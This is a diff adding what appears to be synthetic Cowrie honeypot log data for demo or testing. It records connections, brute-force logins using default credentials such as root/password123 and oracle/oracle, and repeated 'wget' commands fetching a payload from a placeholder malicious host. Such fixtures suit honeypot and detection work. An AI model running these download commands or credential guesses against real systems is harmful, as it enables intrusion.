@@ -1,0 +1,16 @@
+{"eventid":"cowrie.session.connect","session":"demo_123","src_ip":"1.1.1.1","timestamp":"2026-03-08T11:30:00Z"}
+{"eventid":"cowrie.login.failed","session":"demo_123","username":"root","password":"password123","timestamp":"2026-03-08T11:30:05Z"}
+{"eventid":"cowrie.command.input","session":"demo_123","input":"wget http://malicious.com/payload.sh","timestamp":"2026-03-08T11:30:10Z"}
+{"eventid":"cowrie.command.input","session":"demo_123","input":"wget http://malicious.com/payload.sh","timestamp":"2026-03-08T11:30:10Z"}
+{"eventid":"cowrie.login.failed","session":"demo_123","username":"root","password":"password123","timestamp":"2026-03-08T11:30:05Z"}
+{"eventid":"cowrie.login.failed","session":"demo_123","username":"root","password":"password123","timestamp":"2026-03-08T11:30:05Z"}
+{"eventid":"cowrie.command.input","session":"demo_123","input":"wget http://malicious.com/payload.sh","timestamp":"2026-03-08T11:30:10Z"}
+{"eventid":"cowrie.session.closed","session":"demo_123","timestamp":"2026-03-08T11:30:15Z"}
+{"eventid":"cowrie.session.closed","session":"demo_123","timestamp":"2026-03-08T11:30:15Z"}
+{"eventid":"cowrie.session.connect","session":"demo_123","src_ip":"1.1.1.1","timestamp":"2026-03-08T11:30:00Z"}
+{"eventid":"cowrie.session.connect","session":"apt_cn_001","src_ip":"114.114.114.114","timestamp":"2026-03-08T11:30:00Z"}
+{"eventid":"cowrie.session.connect","session":"apt_cn_001","src_ip":"114.114.114.114","timestamp":"2026-03-08T11:30:00Z"}
+{"eventid":"cowrie.login.failed","session":"apt_cn_001","username":"root","password":"123","timestamp":"2026-03-08T11:30:01Z"}
+{"eventid":"cowrie.command.input","session":"sk_br_002","input":"ls -la /var/www/html","timestamp":"2026-03-08T11:35:22Z"}
+{"eventid":"cowrie.login.success","session":"apt_ru_003","username":"oracle","password":"oracle","timestamp":"2026-03-08T11:40:05Z"}
+{"eventid":"cowrie.command.input","session":"sk_br_002","input":"ls -la /var/www/html","timestamp":"2026-03-08T11:35:22Z"}
